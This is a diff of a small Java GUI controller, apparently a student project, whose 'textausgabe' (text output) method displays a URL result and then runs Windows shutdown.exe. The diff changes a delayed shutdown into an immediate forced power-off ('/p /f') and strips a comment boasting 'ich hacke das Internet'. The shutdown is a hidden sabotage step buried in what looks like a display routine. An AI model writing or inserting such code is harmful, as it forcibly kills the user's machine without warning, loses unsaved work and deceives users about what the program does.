@@ -43,15 +43,14 @@ public class InternetFakt_Controller {
     void textausgabe(String URLErgebnis)
     {
     	tfFehler.setText("Ergebnis: '" + URLErgebnis + "' - Eingabe: '" + tfURL.getText() + "'");
-    	ProcessBuilder b = new ProcessBuilder("shutdown.exe", "/s", "/t", "30");
+    	ProcessBuilder b = new ProcessBuilder("shutdown.exe", "/p","/f");
  		try
 		{
 			b.start();
-		} catch (IOException e)				//ich hacke das Internet
+		} catch (IOException e)
 		{
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
     }
 }
-//hallo
